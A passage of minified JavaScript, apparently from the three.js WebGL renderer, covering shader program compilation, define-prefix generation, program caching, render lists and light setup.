        function dr(e, t, n) { const i = e.createShader(t); return e.shaderSource(i, n), e.compileShader(i), i }
        hr.prototype.setValue = function(e, t, n, i) {
            const r = this.map[t];
            void 0 !== r && r.setValue(e, n, i)
        }, hr.prototype.setOptional = function(e, t, n) {
            const i = t[n];
            void 0 !== i && this.setValue(e, n, i)
        }, hr.upload = function(e, t, n, i) {
            for (let r = 0, a = t.length; r !== a; ++r) {
                const a = t[r],
                    o = n[a.id];
                !1 !== o.needsUpdate && a.setValue(e, o.value, i)
            }
        }, hr.seqWithValue = function(e, t) {
            const n = [];
            for (let i = 0, r = e.length; i !== r; ++i) {
                const r = e[i];
                r.id in t && n.push(r)
            }
            return n
        };
        let pr = 0;

        function fr(e) {
            switch (e) {
                case te:
                    return ["Linear", "( value )"];
                case ne:
                    return ["sRGB", "( value )"];
                case 3002:
                    return ["RGBE", "( value )"];
                case 3004:
                    return ["RGBM", "( value, 7.0 )"];
                case 3005:
                    return ["RGBM", "( value, 16.0 )"];
                case 3006:
                    return ["RGBD", "( value, 256.0 )"];
                case 3007:
                    return ["Gamma", "( value, float( GAMMA_FACTOR ) )"];
                case 3003:
                    return ["LogLuv", "( value )"];
                default:
                    return console.warn("THREE.WebGLProgram: Unsupported encoding:", e), ["Linear", "( value )"]
            }
        }

        function mr(e, t, n) {
            const i = e.getShaderParameter(t, 35713),
                r = e.getShaderInfoLog(t).trim();
            return i && "" === r ? "" : "THREE.WebGLShader: gl.getShaderInfoLog() " + n + "\n" + r + function(e) { const t = e.split("\n"); for (let e = 0; e < t.length; e++) t[e] = e + 1 + ": " + t[e]; return t.join("\n") }(e.getShaderSource(t))
        }

        function gr(e, t) { const n = fr(t); return "vec4 " + e + "( vec4 value ) { return " + n[0] + "ToLinear" + n[1] + "; }" }

        function vr(e, t) { const n = fr(t); return "vec4 " + e + "( vec4 value ) { return LinearTo" + n[0] + n[1] + "; }" }

        function yr(e, t) {
            let n;
            switch (t) {
                case 1:
                    n = "Linear";
                    break;
                case 2:
                    n = "Reinhard";
                    break;
                case 3:
                    n = "OptimizedCineon";
                    break;
                case 4:
                    n = "ACESFilmic";
                    break;
                case 5:
                    n = "Custom";
                    break;
                default:
                    console.warn("THREE.WebGLProgram: Unsupported toneMapping:", t), n = "Linear"
            }
            return "vec3 " + e + "( vec3 color ) { return " + n + "ToneMapping( color ); }"
        }

        function xr(e) { return "" !== e }

        function _r(e, t) { return e.replace(/NUM_DIR_LIGHTS/g, t.numDirLights).replace(/NUM_SPOT_LIGHTS/g, t.numSpotLights).replace(/NUM_RECT_AREA_LIGHTS/g, t.numRectAreaLights).replace(/NUM_POINT_LIGHTS/g, t.numPointLights).replace(/NUM_HEMI_LIGHTS/g, t.numHemiLights).replace(/NUM_DIR_LIGHT_SHADOWS/g, t.numDirLightShadows).replace(/NUM_SPOT_LIGHT_SHADOWS/g, t.numSpotLightShadows).replace(/NUM_POINT_LIGHT_SHADOWS/g, t.numPointLightShadows) }

        function br(e, t) { return e.replace(/NUM_CLIPPING_PLANES/g, t.numClippingPlanes).replace(/UNION_CLIPPING_PLANES/g, t.numClippingPlanes - t.numClipIntersection) }
        const wr = /^[ \t]*#include +<([\w\d./]+)>/gm;

        function Mr(e) { return e.replace(wr, Tr) }

        function Tr(e, t) { const n = $n[t]; if (void 0 === n) throw new Error("Can not resolve #include <" + t + ">"); return Mr(n) }
        const Er = /#pragma unroll_loop[\s]+?for \( int i \= (\d+)\; i < (\d+)\; i \+\+ \) \{([\s\S]+?)(?=\})\}/g,
            Sr = /#pragma unroll_loop_start\s+for\s*\(\s*int\s+i\s*=\s*(\d+)\s*;\s*i\s*<\s*(\d+)\s*;\s*i\s*\+\+\s*\)\s*{([\s\S]+?)}\s+#pragma unroll_loop_end/g;

        function Lr(e) { return e.replace(Sr, Rr).replace(Er, Ar) }

        function Ar(e, t, n, i) { return console.warn("WebGLProgram: #pragma unroll_loop shader syntax is deprecated. Please use #pragma unroll_loop_start syntax instead."), Rr(e, t, n, i) }

        function Rr(e, t, n, i) { let r = ""; for (let e = parseInt(t); e < parseInt(n); e++) r += i.replace(/\[\s*i\s*\]/g, "[ " + e + " ]").replace(/UNROLLED_LOOP_INDEX/g, e); return r }

        function Pr(e) { let t = "precision " + e.precision + " float;\nprecision " + e.precision + " int;"; return "highp" === e.precision ? t += "\n#define HIGH_PRECISION" : "mediump" === e.precision ? t += "\n#define MEDIUM_PRECISION" : "lowp" === e.precision && (t += "\n#define LOW_PRECISION"), t }

        function Cr(e, t, n, i) {
            const r = e.getContext(),
                a = n.defines;
            let o = n.vertexShader,
                s = n.fragmentShader;
            const l = function(e) { let t = "SHADOWMAP_TYPE_BASIC"; return 1 === e.shadowMapType ? t = "SHADOWMAP_TYPE_PCF" : 2 === e.shadowMapType ? t = "SHADOWMAP_TYPE_PCF_SOFT" : 3 === e.shadowMapType && (t = "SHADOWMAP_TYPE_VSM"), t }(n),
                c = function(e) {
                    let t = "ENVMAP_TYPE_CUBE";
                    if (e.envMap) switch (e.envMapMode) {
                        case 301:
                        case 302:
                            t = "ENVMAP_TYPE_CUBE";
                            break;
                        case 306:
                        case 307:
                            t = "ENVMAP_TYPE_CUBE_UV"
                    }
                    return t
                }(n),
                u = function(e) {
                    let t = "ENVMAP_MODE_REFLECTION";
                    if (e.envMap) switch (e.envMapMode) {
                        case 302:
                        case 307:
                            t = "ENVMAP_MODE_REFRACTION"
                    }
                    return t
                }(n),
                h = function(e) {
                    let t = "ENVMAP_BLENDING_NONE";
                    if (e.envMap) switch (e.combine) {
                        case 0:
                            t = "ENVMAP_BLENDING_MULTIPLY";
                            break;
                        case 1:
                            t = "ENVMAP_BLENDING_MIX";
                            break;
                        case 2:
                            t = "ENVMAP_BLENDING_ADD"
                    }
                    return t
                }(n),
                d = e.gammaFactor > 0 ? e.gammaFactor : 1,
                p = n.isWebGL2 ? "" : function(e) { return [e.extensionDerivatives || e.envMapCubeUV || e.bumpMap || e.tangentSpaceNormalMap || e.clearcoatNormalMap || e.flatShading || "physical" === e.shaderID ? "#extension GL_OES_standard_derivatives : enable" : "", (e.extensionFragDepth || e.logarithmicDepthBuffer) && e.rendererExtensionFragDepth ? "#extension GL_EXT_frag_depth : enable" : "", e.extensionDrawBuffers && e.rendererExtensionDrawBuffers ? "#extension GL_EXT_draw_buffers : require" : "", (e.extensionShaderTextureLOD || e.envMap) && e.rendererExtensionShaderTextureLod ? "#extension GL_EXT_shader_texture_lod : enable" : ""].filter(xr).join("\n") }(n),
                f = function(e) { const t = []; for (const n in e) { const i = e[n];!1 !== i && t.push("#define " + n + " " + i) } return t.join("\n") }(a),
                m = r.createProgram();
            let g, v, y = n.glslVersion ? "#version " + n.glslVersion + "\n" : "";
            n.isRawShaderMaterial ? (g = [f].filter(xr).join("\n"), g.length > 0 && (g += "\n"), v = [p, f].filter(xr).join("\n"), v.length > 0 && (v += "\n")) : (g = [Pr(n), "#define SHADER_NAME " + n.shaderName, f, n.instancing ? "#define USE_INSTANCING" : "", n.instancingColor ? "#define USE_INSTANCING_COLOR" : "", n.supportsVertexTextures ? "#define VERTEX_TEXTURES" : "", "#define GAMMA_FACTOR " + d, "#define MAX_BONES " + n.maxBones, n.useFog && n.fog ? "#define USE_FOG" : "", n.useFog && n.fogExp2 ? "#define FOG_EXP2" : "", n.map ? "#define USE_MAP" : "", n.envMap ? "#define USE_ENVMAP" : "", n.envMap ? "#define " + u : "", n.lightMap ? "#define USE_LIGHTMAP" : "", n.aoMap ? "#define USE_AOMAP" : "", n.emissiveMap ? "#define USE_EMISSIVEMAP" : "", n.bumpMap ? "#define USE_BUMPMAP" : "", n.normalMap ? "#define USE_NORMALMAP" : "", n.normalMap && n.objectSpaceNormalMap ? "#define OBJECTSPACE_NORMALMAP" : "", n.normalMap && n.tangentSpaceNormalMap ? "#define TANGENTSPACE_NORMALMAP" : "", n.clearcoatMap ? "#define USE_CLEARCOATMAP" : "", n.clearcoatRoughnessMap ? "#define USE_CLEARCOAT_ROUGHNESSMAP" : "", n.clearcoatNormalMap ? "#define USE_CLEARCOAT_NORMALMAP" : "", n.displacementMap && n.supportsVertexTextures ? "#define USE_DISPLACEMENTMAP" : "", n.specularMap ? "#define USE_SPECULARMAP" : "", n.roughnessMap ? "#define USE_ROUGHNESSMAP" : "", n.metalnessMap ? "#define USE_METALNESSMAP" : "", n.alphaMap ? "#define USE_ALPHAMAP" : "", n.transmissionMap ? "#define USE_TRANSMISSIONMAP" : "", n.vertexTangents ? "#define USE_TANGENT" : "", n.vertexColors ? "#define USE_COLOR" : "", n.vertexUvs ? "#define USE_UV" : "", n.uvsVertexOnly ? "#define UVS_VERTEX_ONLY" : "", n.flatShading ? "#define FLAT_SHADED" : "", n.skinning ? "#define USE_SKINNING" : "", n.useVertexTexture ? "#define BONE_TEXTURE" : "", n.morphTargets ? "#define USE_MORPHTARGETS" : "", n.morphNormals && !1 === n.flatShading ? "#define USE_MORPHNORMALS" : "", n.doubleSided ? "#define DOUBLE_SIDED" : "", n.flipSided ? "#define FLIP_SIDED" : "", n.shadowMapEnabled ? "#define USE_SHADOWMAP" : "", n.shadowMapEnabled ? "#define " + l : "", n.sizeAttenuation ? "#define USE_SIZEATTENUATION" : "", n.logarithmicDepthBuffer ? "#define USE_LOGDEPTHBUF" : "", n.logarithmicDepthBuffer && n.rendererExtensionFragDepth ? "#define USE_LOGDEPTHBUF_EXT" : "", "uniform mat4 modelMatrix;", "uniform mat4 modelViewMatrix;", "uniform mat4 projectionMatrix;", "uniform mat4 viewMatrix;", "uniform mat3 normalMatrix;", "uniform vec3 cameraPosition;", "uniform bool isOrthographic;", "#ifdef USE_INSTANCING", "\tattribute mat4 instanceMatrix;", "#endif", "#ifdef USE_INSTANCING_COLOR", "\tattribute vec3 instanceColor;", "#endif", "attribute vec3 position;", "attribute vec3 normal;", "attribute vec2 uv;", "#ifdef USE_TANGENT", "\tattribute vec4 tangent;", "#endif", "#ifdef USE_COLOR", "\tattribute vec3 color;", "#endif", "#ifdef USE_MORPHTARGETS", "\tattribute vec3 morphTarget0;", "\tattribute vec3 morphTarget1;", "\tattribute vec3 morphTarget2;", "\tattribute vec3 morphTarget3;", "\t#ifdef USE_MORPHNORMALS", "\t\tattribute vec3 morphNormal0;", "\t\tattribute vec3 morphNormal1;", "\t\tattribute vec3 morphNormal2;", "\t\tattribute vec3 morphNormal3;", "\t#else", "\t\tattribute vec3 morphTarget4;", "\t\tattribute vec3 morphTarget5;", "\t\tattribute vec3 morphTarget6;", "\t\tattribute vec3 morphTarget7;", "\t#endif", "#endif", "#ifdef USE_SKINNING", "\tattribute vec4 skinIndex;", "\tattribute vec4 skinWeight;", "#endif", "\n"].filter(xr).join("\n"), v = [p, Pr(n), "#define SHADER_NAME " + n.shaderName, f, n.alphaTest ? "#define ALPHATEST " + n.alphaTest + (n.alphaTest % 1 ? "" : ".0") : "", "#define GAMMA_FACTOR " + d, n.useFog && n.fog ? "#define USE_FOG" : "", n.useFog && n.fogExp2 ? "#define FOG_EXP2" : "", n.map ? "#define USE_MAP" : "", n.matcap ? "#define USE_MATCAP" : "", n.envMap ? "#define USE_ENVMAP" : "", n.envMap ? "#define " + c : "", n.envMap ? "#define " + u : "", n.envMap ? "#define " + h : "", n.lightMap ? "#define USE_LIGHTMAP" : "", n.aoMap ? "#define USE_AOMAP" : "", n.emissiveMap ? "#define USE_EMISSIVEMAP" : "", n.bumpMap ? "#define USE_BUMPMAP" : "", n.normalMap ? "#define USE_NORMALMAP" : "", n.normalMap && n.objectSpaceNormalMap ? "#define OBJECTSPACE_NORMALMAP" : "", n.normalMap && n.tangentSpaceNormalMap ? "#define TANGENTSPACE_NORMALMAP" : "", n.clearcoatMap ? "#define USE_CLEARCOATMAP" : "", n.clearcoatRoughnessMap ? "#define USE_CLEARCOAT_ROUGHNESSMAP" : "", n.clearcoatNormalMap ? "#define USE_CLEARCOAT_NORMALMAP" : "", n.specularMap ? "#define USE_SPECULARMAP" : "", n.roughnessMap ? "#define USE_ROUGHNESSMAP" : "", n.metalnessMap ? "#define USE_METALNESSMAP" : "", n.alphaMap ? "#define USE_ALPHAMAP" : "", n.sheen ? "#define USE_SHEEN" : "", n.transmissionMap ? "#define USE_TRANSMISSIONMAP" : "", n.vertexTangents ? "#define USE_TANGENT" : "", n.vertexColors || n.instancingColor ? "#define USE_COLOR" : "", n.vertexUvs ? "#define USE_UV" : "", n.uvsVertexOnly ? "#define UVS_VERTEX_ONLY" : "", n.gradientMap ? "#define USE_GRADIENTMAP" : "", n.flatShading ? "#define FLAT_SHADED" : "", n.doubleSided ? "#define DOUBLE_SIDED" : "", n.flipSided ? "#define FLIP_SIDED" : "", n.shadowMapEnabled ? "#define USE_SHADOWMAP" : "", n.shadowMapEnabled ? "#define " + l : "", n.premultipliedAlpha ? "#define PREMULTIPLIED_ALPHA" : "", n.physicallyCorrectLights ? "#define PHYSICALLY_CORRECT_LIGHTS" : "", n.logarithmicDepthBuffer ? "#define USE_LOGDEPTHBUF" : "", n.logarithmicDepthBuffer && n.rendererExtensionFragDepth ? "#define USE_LOGDEPTHBUF_EXT" : "", (n.extensionShaderTextureLOD || n.envMap) && n.rendererExtensionShaderTextureLod ? "#define TEXTURE_LOD_EXT" : "", "uniform mat4 viewMatrix;", "uniform vec3 cameraPosition;", "uniform bool isOrthographic;", 0 !== n.toneMapping ? "#define TONE_MAPPING" : "", 0 !== n.toneMapping ? $n.tonemapping_pars_fragment : "", 0 !== n.toneMapping ? yr("toneMapping", n.toneMapping) : "", n.dithering ? "#define DITHERING" : "", $n.encodings_pars_fragment, n.map ? gr("mapTexelToLinear", n.mapEncoding) : "", n.matcap ? gr("matcapTexelToLinear", n.matcapEncoding) : "", n.envMap ? gr("envMapTexelToLinear", n.envMapEncoding) : "", n.emissiveMap ? gr("emissiveMapTexelToLinear", n.emissiveMapEncoding) : "", n.lightMap ? gr("lightMapTexelToLinear", n.lightMapEncoding) : "", vr("linearToOutputTexel", n.outputEncoding), n.depthPacking ? "#define DEPTH_PACKING " + n.depthPacking : "", "\n"].filter(xr).join("\n")), o = Mr(o), o = _r(o, n), o = br(o, n), s = Mr(s), s = _r(s, n), s = br(s, n), o = Lr(o), s = Lr(s), n.isWebGL2 && !0 !== n.isRawShaderMaterial && (y = "#version 300 es\n", g = ["#define attribute in", "#define varying out", "#define texture2D texture"].join("\n") + "\n" + g, v = ["#define varying in", n.glslVersion === oe ? "" : "out highp vec4 pc_fragColor;", n.glslVersion === oe ? "" : "#define gl_FragColor pc_fragColor", "#define gl_FragDepthEXT gl_FragDepth", "#define texture2D texture", "#define textureCube texture", "#define texture2DProj textureProj", "#define texture2DLodEXT textureLod", "#define texture2DProjLodEXT textureProjLod", "#define textureCubeLodEXT textureLod", "#define texture2DGradEXT textureGrad", "#define texture2DProjGradEXT textureProjGrad", "#define textureCubeGradEXT textureGrad"].join("\n") + "\n" + v);
            const x = y + v + s,
                _ = dr(r, 35633, y + g + o),
                b = dr(r, 35632, x);
            if (r.attachShader(m, _), r.attachShader(m, b), void 0 !== n.index0AttributeName ? r.bindAttribLocation(m, 0, n.index0AttributeName) : !0 === n.morphTargets && r.bindAttribLocation(m, 0, "position"), r.linkProgram(m), e.debug.checkShaderErrors) {
                const e = r.getProgramInfoLog(m).trim(),
                    t = r.getShaderInfoLog(_).trim(),
                    n = r.getShaderInfoLog(b).trim();
                let i = !0,
                    a = !0;
                if (!1 === r.getProgramParameter(m, 35714)) {
                    i = !1;
                    const t = mr(r, _, "vertex"),
                        n = mr(r, b, "fragment");
                    console.error("THREE.WebGLProgram: shader error: ", r.getError(), "35715", r.getProgramParameter(m, 35715), "gl.getProgramInfoLog", e, t, n)
                } else "" !== e ? console.warn("THREE.WebGLProgram: gl.getProgramInfoLog()", e) : "" !== t && "" !== n || (a = !1);
                a && (this.diagnostics = { runnable: i, programLog: e, vertexShader: { log: t, prefix: g }, fragmentShader: { log: n, prefix: v } })
            }
            let w, M;
            return r.deleteShader(_), r.deleteShader(b), this.getUniforms = function() { return void 0 === w && (w = new hr(r, m)), w }, this.getAttributes = function() {
                return void 0 === M && (M = function(e, t) {
                    const n = {},
                        i = e.getProgramParameter(t, 35721);
                    for (let r = 0; r < i; r++) {
                        const i = e.getActiveAttrib(t, r).name;
                        n[i] = e.getAttribLocation(t, i)
                    }
                    return n
                }(r, m)), M
            }, this.destroy = function() { i.releaseStatesOfProgram(this), r.deleteProgram(m), this.program = void 0 }, this.name = n.shaderName, this.id = pr++, this.cacheKey = t, this.usedTimes = 1, this.program = m, this.vertexShader = _, this.fragmentShader = b, this
        }

        function Dr(e, t, n, i, r, a) {
            const o = [],
                s = i.isWebGL2,
                l = i.logarithmicDepthBuffer,
                c = i.floatVertexTextures,
                u = i.maxVertexUniforms,
                h = i.vertexTextures;
            let d = i.precision;
            const p = { MeshDepthMaterial: "depth", MeshDistanceMaterial: "distanceRGBA", MeshNormalMaterial: "normal", MeshBasicMaterial: "basic", MeshLambertMaterial: "lambert", MeshPhongMaterial: "phong", MeshToonMaterial: "toon", MeshStandardMaterial: "physical", MeshPhysicalMaterial: "physical", MeshMatcapMaterial: "matcap", LineBasicMaterial: "basic", LineDashedMaterial: "dashed", PointsMaterial: "points", ShadowMaterial: "shadow", SpriteMaterial: "sprite" },
                f = ["precision", "isWebGL2", "supportsVertexTextures", "outputEncoding", "instancing", "instancingColor", "map", "mapEncoding", "matcap", "matcapEncoding", "envMap", "envMapMode", "envMapEncoding", "envMapCubeUV", "lightMap", "lightMapEncoding", "aoMap", "emissiveMap", "emissiveMapEncoding", "bumpMap", "normalMap", "objectSpaceNormalMap", "tangentSpaceNormalMap", "clearcoatMap", "clearcoatRoughnessMap", "clearcoatNormalMap", "displacementMap", "specularMap", "roughnessMap", "metalnessMap", "gradientMap", "alphaMap", "combine", "vertexColors", "vertexTangents", "vertexUvs", "uvsVertexOnly", "fog", "useFog", "fogExp2", "flatShading", "sizeAttenuation", "logarithmicDepthBuffer", "skinning", "maxBones", "useVertexTexture", "morphTargets", "morphNormals", "maxMorphTargets", "maxMorphNormals", "premultipliedAlpha", "numDirLights", "numPointLights", "numSpotLights", "numHemiLights", "numRectAreaLights", "numDirLightShadows", "numPointLightShadows", "numSpotLightShadows", "shadowMapEnabled", "shadowMapType", "toneMapping", "physicallyCorrectLights", "alphaTest", "doubleSided", "flipSided", "numClippingPlanes", "numClipIntersection", "depthPacking", "dithering", "sheen", "transmissionMap"];

            function m(e) { let t; return e && e.isTexture ? t = e.encoding : e && e.isWebGLRenderTarget ? (console.warn("THREE.WebGLPrograms.getTextureEncodingFromMap: don't use render targets as textures. Use their .texture property instead."), t = e.texture.encoding) : t = te, t }
            return {
                getParameters: function(r, o, f, g, v) {
                    const y = g.fog,
                        x = r.isMeshStandardMaterial ? g.environment : null,
                        _ = t.get(r.envMap || x),
                        b = p[r.type],
                        w = v.isSkinnedMesh ? function(e) {
                            const t = e.skeleton.bones;
                            if (c) return 1024; {
                                const e = u,
                                    n = Math.floor((e - 20) / 4),
                                    i = Math.min(n, t.length);
                                return i < t.length ? (console.warn("THREE.WebGLRenderer: Skeleton has " + t.length + " bones. This GPU supports " + i + "."), 0) : i
                            }
                        }(v) : 0;
                    let M, T;
                    if (null !== r.precision && (d = i.getMaxPrecision(r.precision), d !== r.precision && console.warn("THREE.WebGLProgram.getParameters:", r.precision, "not supported, using", d, "instead.")), b) {
                        const e = ei[b];
                        M = e.vertexShader, T = e.fragmentShader
                    } else M = r.vertexShader, T = r.fragmentShader;
                    const E = e.getRenderTarget();
                    return { isWebGL2: s, shaderID: b, shaderName: r.type, vertexShader: M, fragmentShader: T, defines: r.defines, isRawShaderMaterial: !0 === r.isRawShaderMaterial, glslVersion: r.glslVersion, precision: d, instancing: !0 === v.isInstancedMesh, instancingColor: !0 === v.isInstancedMesh && null !== v.instanceColor, supportsVertexTextures: h, outputEncoding: null !== E ? m(E.texture) : e.outputEncoding, map: !!r.map, mapEncoding: m(r.map), matcap: !!r.matcap, matcapEncoding: m(r.matcap), envMap: !!_, envMapMode: _ && _.mapping, envMapEncoding: m(_), envMapCubeUV: !!_ && (306 === _.mapping || 307 === _.mapping), lightMap: !!r.lightMap, lightMapEncoding: m(r.lightMap), aoMap: !!r.aoMap, emissiveMap: !!r.emissiveMap, emissiveMapEncoding: m(r.emissiveMap), bumpMap: !!r.bumpMap, normalMap: !!r.normalMap, objectSpaceNormalMap: 1 === r.normalMapType, tangentSpaceNormalMap: 0 === r.normalMapType, clearcoatMap: !!r.clearcoatMap, clearcoatRoughnessMap: !!r.clearcoatRoughnessMap, clearcoatNormalMap: !!r.clearcoatNormalMap, displacementMap: !!r.displacementMap, roughnessMap: !!r.roughnessMap, metalnessMap: !!r.metalnessMap, specularMap: !!r.specularMap, alphaMap: !!r.alphaMap, gradientMap: !!r.gradientMap, sheen: !!r.sheen, transmissionMap: !!r.transmissionMap, combine: r.combine, vertexTangents: r.normalMap && r.vertexTangents, vertexColors: r.vertexColors, vertexUvs: !!(r.map || r.bumpMap || r.normalMap || r.specularMap || r.alphaMap || r.emissiveMap || r.roughnessMap || r.metalnessMap || r.clearcoatMap || r.clearcoatRoughnessMap || r.clearcoatNormalMap || r.displacementMap || r.transmissionMap), uvsVertexOnly: !(r.map || r.bumpMap || r.normalMap || r.specularMap || r.alphaMap || r.emissiveMap || r.roughnessMap || r.metalnessMap || r.clearcoatNormalMap || r.transmissionMap || !r.displacementMap), fog: !!y, useFog: r.fog, fogExp2: y && y.isFogExp2, flatShading: !!r.flatShading, sizeAttenuation: r.sizeAttenuation, logarithmicDepthBuffer: l, skinning: r.skinning && w > 0, maxBones: w, useVertexTexture: c, morphTargets: r.morphTargets, morphNormals: r.morphNormals, maxMorphTargets: e.maxMorphTargets, maxMorphNormals: e.maxMorphNormals, numDirLights: o.directional.length, numPointLights: o.point.length, numSpotLights: o.spot.length, numRectAreaLights: o.rectArea.length, numHemiLights: o.hemi.length, numDirLightShadows: o.directionalShadowMap.length, numPointLightShadows: o.pointShadowMap.length, numSpotLightShadows: o.spotShadowMap.length, numClippingPlanes: a.numPlanes, numClipIntersection: a.numIntersection, dithering: r.dithering, shadowMapEnabled: e.shadowMap.enabled && f.length > 0, shadowMapType: e.shadowMap.type, toneMapping: r.toneMapped ? e.toneMapping : 0, physicallyCorrectLights: e.physicallyCorrectLights, premultipliedAlpha: r.premultipliedAlpha, alphaTest: r.alphaTest, doubleSided: 2 === r.side, flipSided: 1 === r.side, depthPacking: void 0 !== r.depthPacking && r.depthPacking, index0AttributeName: r.index0AttributeName, extensionDerivatives: r.extensions && r.extensions.derivatives, extensionFragDepth: r.extensions && r.extensions.fragDepth, extensionDrawBuffers: r.extensions && r.extensions.drawBuffers, extensionShaderTextureLOD: r.extensions && r.extensions.shaderTextureLOD, rendererExtensionFragDepth: s || n.has("EXT_frag_depth"), rendererExtensionDrawBuffers: s || n.has("WEBGL_draw_buffers"), rendererExtensionShaderTextureLod: s || n.has("EXT_shader_texture_lod"), customProgramCacheKey: r.customProgramCacheKey() }
                },
                getProgramCacheKey: function(t) {
                    const n = [];
                    if (t.shaderID ? n.push(t.shaderID) : (n.push(t.fragmentShader), n.push(t.vertexShader)), void 0 !== t.defines)
                        for (const e in t.defines) n.push(e), n.push(t.defines[e]);
                    if (!1 === t.isRawShaderMaterial) {
                        for (let e = 0; e < f.length; e++) n.push(t[f[e]]);
                        n.push(e.outputEncoding), n.push(e.gammaFactor)
                    }
                    return n.push(t.customProgramCacheKey), n.join()
                },
                getUniforms: function(e) {
                    const t = p[e.type];
                    let n;
                    if (t) {
                        const e = ei[t];
                        n = Un.clone(e.uniforms)
                    } else n = e.uniforms;
                    return n
                },
                acquireProgram: function(t, n) { let i; for (let e = 0, t = o.length; e < t; e++) { const t = o[e]; if (t.cacheKey === n) { i = t, ++i.usedTimes; break } } return void 0 === i && (i = new Cr(e, n, t, r), o.push(i)), i },
                releaseProgram: function(e) {
                    if (0 == --e.usedTimes) {
                        const t = o.indexOf(e);
                        o[t] = o[o.length - 1], o.pop(), e.destroy()
                    }
                },
                programs: o
            }
        }

        function Nr() { let e = new WeakMap; return { get: function(t) { let n = e.get(t); return void 0 === n && (n = {}, e.set(t, n)), n }, remove: function(t) { e.delete(t) }, update: function(t, n, i) { e.get(t)[n] = i }, dispose: function() { e = new WeakMap } } }

        function Ir(e, t) { return e.groupOrder !== t.groupOrder ? e.groupOrder - t.groupOrder : e.renderOrder !== t.renderOrder ? e.renderOrder - t.renderOrder : e.program !== t.program ? e.program.id - t.program.id : e.material.id !== t.material.id ? e.material.id - t.material.id : e.z !== t.z ? e.z - t.z : e.id - t.id }

        function Or(e, t) { return e.groupOrder !== t.groupOrder ? e.groupOrder - t.groupOrder : e.renderOrder !== t.renderOrder ? e.renderOrder - t.renderOrder : e.z !== t.z ? t.z - e.z : e.id - t.id }

        function Hr(e) {
            const t = [];
            let n = 0;
            const i = [],
                r = [],
                a = { id: -1 };

            function o(i, r, o, s, l, c) { let u = t[n]; const h = e.get(o); return void 0 === u ? (u = { id: i.id, object: i, geometry: r, material: o, program: h.program || a, groupOrder: s, renderOrder: i.renderOrder, z: l, group: c }, t[n] = u) : (u.id = i.id, u.object = i, u.geometry = r, u.material = o, u.program = h.program || a, u.groupOrder = s, u.renderOrder = i.renderOrder, u.z = l, u.group = c), n++, u }
            return {
                opaque: i,
                transparent: r,
                init: function() { n = 0, i.length = 0, r.length = 0 },
                push: function(e, t, n, a, s, l) {
                    const c = o(e, t, n, a, s, l);
                    (!0 === n.transparent ? r : i).push(c)
                },
                unshift: function(e, t, n, a, s, l) {
                    const c = o(e, t, n, a, s, l);
                    (!0 === n.transparent ? r : i).unshift(c)
                },
                finish: function() {
                    for (let e = n, i = t.length; e < i; e++) {
                        const n = t[e];
                        if (null === n.id) break;
                        n.id = null, n.object = null, n.geometry = null, n.material = null, n.program = null, n.group = null
                    }
                },
                sort: function(e, t) { i.length > 1 && i.sort(e || Ir), r.length > 1 && r.sort(t || Or) }
            }
        }

        function Ur(e) { let t = new WeakMap; return { get: function(n, i) { let r; return !1 === t.has(n) ? (r = new Hr(e), t.set(n, [r])) : i >= t.get(n).length ? (r = new Hr(e), t.get(n).push(r)) : r = t.get(n)[i], r }, dispose: function() { t = new WeakMap } } }

        function Fr() {
            const e = {};
            return {
                get: function(t) {
                    if (void 0 !== e[t.id]) return e[t.id];
                    let n;
                    switch (t.type) {
                        case "DirectionalLight":
                            n = { direction: new be, color: new Wt };
                            break;
                        case "SpotLight":
                            n = { position: new be, direction: new be, color: new Wt, distance: 0, coneCos: 0, penumbraCos: 0, decay: 0 };
                            break;
                        case "PointLight":
                            n = { position: new be, color: new Wt, distance: 0, decay: 0 };
                            break;
                        case "HemisphereLight":
                            n = { direction: new be, skyColor: new Wt, groundColor: new Wt };
                            break;
                        case "RectAreaLight":
                            n = { color: new Wt, position: new be, halfWidth: new be, halfHeight: new be }
                    }
                    return e[t.id] = n, n
                }
            }
        }
        let zr = 0;

        function Br(e, t) { return (t.castShadow ? 1 : 0) - (e.castShadow ? 1 : 0) }

        function Gr(e, t) {
            const n = new Fr,
                i = function() {
                    const e = {};
                    return {
                        get: function(t) {
                            if (void 0 !== e[t.id]) return e[t.id];
                            let n;
                            switch (t.type) {
                                case "DirectionalLight":
                                case "SpotLight":
                                    n = { shadowBias: 0, shadowNormalBias: 0, shadowRadius: 1, shadowMapSize: new he };
                                    break;
                                case "PointLight":
                                    n = { shadowBias: 0, shadowNormalBias: 0, shadowRadius: 1, shadowMapSize: new he, shadowCameraNear: 1, shadowCameraFar: 1e3 }
                            }
                            return e[t.id] = n, n
                        }
                    }
                }(),
                r = { version: 0, hash: { directionalLength: -1, pointLength: -1, spotLength: -1, rectAreaLength: -1, hemiLength: -1, numDirectionalShadows: -1, numPointShadows: -1, numSpotShadows: -1 }, ambient: [0, 0, 0], probe: [], directional: [], directionalShadow: [], directionalShadowMap: [], directionalShadowMatrix: [], spot: [], spotShadow: [], spotShadowMap: [], spotShadowMatrix: [], rectArea: [], rectAreaLTC1: null, rectAreaLTC2: null, point: [], pointShadow: [], pointShadowMap: [], pointShadowMatrix: [], hemi: [] };
            for (let e = 0; e < 9; e++) r.probe.push(new be);
            const a = new be,
                o = new Ze,
                s = new Ze;
            return {
                setup: function(a) {
                    let o = 0,
                        s = 0,
                        l = 0;
                    for (let e = 0; e < 9; e++) r.probe[e].set(0, 0, 0);
                    let c = 0,
                        u = 0,
                        h = 0,
                        d = 0,
                        p = 0,
                        f = 0,
                        m = 0,
                        g = 0;
                    a.sort(Br);
                    for (let e = 0, t = a.length; e < t; e++) {
                        const t = a[e],
                            v = t.color,
                            y = t.intensity,
                            x = t.distance,
                            _ = t.shadow && t.shadow.map ? t.shadow.map.texture : null;
                        if (t.isAmbientLight) o += v.r * y, s += v.g * y, l += v.b * y;
                        else if (t.isLightProbe)
                            for (let e = 0; e < 9; e++) r.probe[e].addScaledVector(t.sh.coefficients[e], y);
                        else if (t.isDirectionalLight) {
                            const e = n.get(t);
                            if (e.color.copy(t.color).multiplyScalar(t.intensity), t.castShadow) {
                                const e = t.shadow,
                                    n = i.get(t);
                                n.shadowBias = e.bias, n.shadowNormalBias = e.normalBias, n.shadowRadius = e.radius, n.shadowMapSize = e.mapSize, r.directionalShadow[c] = n, r.directionalShadowMap[c] = _, r.directionalShadowMatrix[c] = t.shadow.matrix, f++
                            }
                            r.directional[c] = e, c++
                        } else if (t.isSpotLight) {
                            const e = n.get(t);
